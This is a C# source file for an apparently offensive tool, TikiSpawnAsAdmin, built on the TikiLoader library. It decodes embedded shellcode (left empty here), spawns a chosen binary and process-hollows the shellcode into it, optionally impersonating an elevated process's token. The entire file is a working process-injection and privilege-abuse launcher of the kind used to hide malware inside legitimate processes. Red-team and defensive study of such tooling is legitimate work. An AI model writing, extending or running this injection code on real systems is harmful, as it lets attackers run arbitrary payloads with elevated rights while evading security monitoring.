using System;
using System.Threading;

using NDesk.Options;
using TikiLoader;

namespace TikiSpawnAsAdmin
{
    class Program
    {
        static void Main(string[] args)
        {
            string binary = null;
            int elevatedPid = 0;
            bool help = false;

            byte[] shellcode = Generic.DecompressShellcode(Convert.FromBase64String(""));

            var options = new OptionSet()
            {
                { "b|binary=", "Binary to spawn & inject", v => binary = v },
                { "p|pid=", "Elevated PID to impersonate (optional)", v => elevatedPid = int.Parse(v) },
                { "h|?|help", "Show this help", v => help = true }
            };

            try
            {
                options.Parse(args);

                if (help || binary == null)
                {
                    options.WriteOptionDescriptions(Console.Out);
                    return;
                }
                else
                {
                    var hollower = new Hollower();
                    hollower.HollowElevated(binary, shellcode, elevatedPid);
                    //while (true)
                    //{
                    //    Thread.Sleep(1000);
                    //}
                }
                
            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
            }
        }
    }
}